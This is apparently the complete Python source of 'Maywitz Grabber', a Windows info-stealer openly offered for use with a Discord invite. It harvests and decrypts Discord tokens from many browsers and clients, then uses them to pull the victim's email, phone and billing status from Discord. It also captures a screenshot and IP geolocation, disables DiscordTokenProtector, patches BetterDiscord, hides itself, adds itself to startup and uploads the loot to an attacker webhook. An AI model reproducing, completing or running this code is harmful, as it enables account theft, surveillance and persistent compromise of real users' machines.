import psutil
import asyncio
import threading
import subprocess
import os
import ctypes
import json
import sqlite3
import zipfile
import httpx
import shutil

from PIL import ImageGrab
from re import findall, match
from tempfile import mkdtemp
from sys import argv
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

webhook_url = "Webhook link goes here, keep the quotes"

"""
Don't change any of the code below here, unless you know what you're doing --- Maywitz

This is only the free version, join the discord server at https://discord.gg/8TfaWhM2jr for more info 

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Star this repository, it would support me a lot!

--Thanks <3

Join the discord server at https://discord.gg/8TfaWhM2jr

"""

class functions(object):
    @staticmethod
    def getHeaders(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    @staticmethod
    def get_decryption_key(path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            temp = f.read()
        local = json.loads(temp)
        decryption_key = b64decode(local["os_crypt"]["encrypted_key"])
        decryption_key = decryption_key[5:]
        decryption_key = CryptUnprotectData(decryption_key, None, None, None, 0)[1]
        
        return decryption_key

    @staticmethod
    def decrypt_stuff(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_stuff = cipher.decrypt(payload)
            decrypted_stuff = decrypted_stuff[:-16].decode()
            
            return decrypted_stuff
        except Exception:
          
            return "Could not decrypt this piece of shit"


class Maywitz_Grabber(functions):
    def __init__(self):
        self.webhook_url = webhook_url
        self.discordurl = "https://discord.com/api/v9/users/@me"
        
        self.roaming = os.getenv("appdata")
        self.localappdata = os.getenv("localappdata")
        
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
        
        self.tokens = []
        
        self.dir = mkdtemp()
        self.sep = os.sep
        os.makedirs(self.dir, exist_ok = True)

    def try_this_shit(func):
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

    async def checkToken(self, token: str) -> str:
        try:
            temp = httpx.get(
                url = self.discordurl,
                headers = self.getHeaders(token),
                timeout = 5.0
            )
        except (httpx._exceptions.ConnectTimeout, httpx._exceptions.TimeoutException):
            pass
        if token not in self.tokens and temp.status_code == 200:
            self.tokens.append(token)

    async def init(self):
        await self.fuckBetterDiscord()
        await self.fuckTokenProtector()
        
        function_list = [self.take_screenshot, self.stealTokens, self.fuckoff, self.addToStart]

        for func in function_list:
            process = threading.Thread(target = func, daemon = True)
            process.start()
        for c in threading.enumerate():
            try:
                c.join()
            except RuntimeError:
                continue
        self.writeTokens()
        self.finalize()
        shutil.rmtree(self.dir)

    def fuckoff(self):
        ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)

    def addToStart(self):
        try:
            shutil.copy2(argv[0], self.startup)
        except Exception:
            pass


    async def fuckTokenProtector(self):
        tp_path = f"{self.roaming}\\DiscordTokenProtector\\"
        if not os.path.exists(tp_path):
            return
        config = tp_path + "config.json"

        for retard in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp_path + retard)
            except FileNotFoundError:
                pass
        if os.path.exists(config):
            with open(config, errors = "ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_redownloadhashes'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
            with open(config, 'w') as p:
                json.dump(item, p, indent = 2, sort_keys = True)

    async def fuckBetterDiscord(self):
        bd_path = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
        if os.path.exists(bd_path):
            temp_path = "api/webhooks"
            with open(bd_path, 'r', encoding = "cp437", errors = 'ignore') as f:
                txt = f.read()
                content = txt.replace(temp_path, 'FUCKOFF BETTERDISCORD AAAAA')
            with open(bd_path, 'w', newline='', encoding = "cp437", errors='ignore') as f:
                f.write(content)

    @try_this_shit
    def stealTokens(self):
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.localappdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.localappdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.localappdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.localappdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.localappdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.localappdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.localappdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.localappdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.localappdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.localappdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.localappdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.localappdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Uran': self.localappdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.localappdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.localappdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.localappdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = self.decrypt_stuff(b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]), self.get_decryption_key(self.roaming+f'\\{disc}\\Local State'))
                                asyncio.run(self.checkToken(token))
            else:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                asyncio.run(self.checkToken(token))

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                asyncio.run(self.checkToken(token))


    def writeTokens(self):
        f = open(self.dir+"\\Discord.txt",
                 "w", encoding = "cp437", errors = 'ignore')
        for token in self.tokens:
            j = httpx.get(
                self.discordurl, headers = self.getHeaders(token)).json()
            user = j.get('username') + '#' + str(j.get("discriminator"))
            email = j.get("email")
            phone = j.get("phone") if j.get(
                "phone") else "No Phone Number"
            nitro_data = httpx.get(
                self.discordurl+'/billing/subscriptions', headers = self.getHeaders(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(httpx.get(
                self.discordurl+"/billing/payment-sources", headers = self.getHeaders(token)).text)) > 0)
            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nBilling: {billing}\nNitro: {has_nitro}\nEmail: {email}\nPhone: {phone}\n\n")
        f.close()

    def take_screenshot(self):
        image = ImageGrab.grab(
            bbox = None,
            include_layered_windows = False,
            all_screens = True,
            xdisplay = None
        )
        image.save(self.dir + "\\Screenshot.png")
        image.close()

    def finalize(self):
        pulled_ram = str(psutil.virtual_memory()[0]/1024/1024/1024).split(".")[0]
        pulled_disk = str(psutil.disk_usage('/')[0]/1024/1024/1024).split(".")[0]
        data = httpx.get("https://ipinfo.io/json").json()
        pulled_googlemap = "https://www.google.com/maps/search/google+map++" + \
            data.get('loc')
        pulled_ip = data.get('ip').replace(" ", "᠎ ")
        pulled_city = data.get('city').replace(" ", "᠎ ")
        pulled_country = data.get('country').replace(" ", "᠎ ")
        pulled_region = data.get('region').replace(" ", "᠎ ")
        pulled_org = data.get('org').replace(" ", "᠎ ")
        newzip = os.path.join(
            self.localappdata, f'Maywitz-Info-[{os.getlogin()}].zip')
        maywitz_zip = zipfile.ZipFile(newzip, "w", zipfile.ZIP_DEFLATED)
        filesz = os.path.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(filesz) + 1:]
                maywitz_zip.write(absname, arcname)
        maywitz_zip.close()
        tokens = ''
        for toe in self.tokens:
            tokens += f'{toe}\n'
        embed = {
            'username'
            'avatar_url': 'https://raw.githubusercontent.com/Maywitz/Images/main/Profile-Picture/Maywitz.png',
            'embeds': [
                {
                    'author': {
                        'name': f'*Maywitz grabbed {os.getlogin()}*',
                        'url': 'https://github.com/Maywitz/Maywitz-Grabber',
                        'icon_url': 'https://raw.githubusercontent.com/Maywitz/Images/main/Profile-Picture/Maywitz.png'
                    },
                    'description': f'[Maps Location]({pulled_googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                IP:᠎ {pulled_ip}
                                Org:᠎ {pulled_org}
                                Region:᠎ {pulled_region}
                                Country:᠎ {pulled_country}
                                City:᠎ {pulled_city}```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                PCName: {os.getenv('COMPUTERNAME').replace(" ", "᠎ ")}
                                DiskSpace:᠎ {pulled_disk}GB
                                Ram:᠎ {pulled_ram}GB```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '**Tokens:**',
                            'value': f'''```yaml
                                {tokens if tokens else "None"}```
                            '''.replace(' ', ''),
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': 'Maywitz Grabber, https://discord.gg/8TfaWhM2jr'
                    }
                }
            ]
        }
        httpx.post(self.webhook_url, json = embed)
        with open(newzip, 'rb') as f:
            httpx.post(self.webhook_url, files = {'upload_file': f})
        os.remove(newzip)


if __name__ == "__main__" and os.name == "nt":
    asyncio.run(Maywitz_Grabber().init())
